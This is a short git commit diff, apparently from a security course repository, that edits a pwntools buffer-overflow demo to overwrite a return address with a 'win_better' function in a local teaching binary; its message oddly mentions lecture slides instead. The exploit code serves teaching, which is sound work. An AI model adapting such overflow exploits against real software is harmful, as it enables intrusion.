2e91dead6849e3bb3c47a0eede4572ee78fe5cbf
Lachlan <lachlanwaugh8@gmail.com>
2022-06-07 22:42:20 +1000

    added link for week02 lecture slides to index page.

--- demos/buffer_overflow/buffer.py
+++ demos/buffer_overflow/buffer.py
@@ -1,9 +1,10 @@
 from pwn import *
 
 p = process('./buffer_demo')
+elf = ELF('./buffer_demo')
 
 payload = b'A' * (0x34 - 0xC)
-payload += b'1'
+payload += p32(elf.symbols['win_better'])
 
 p.sendlineafter(b'password', payload)
 
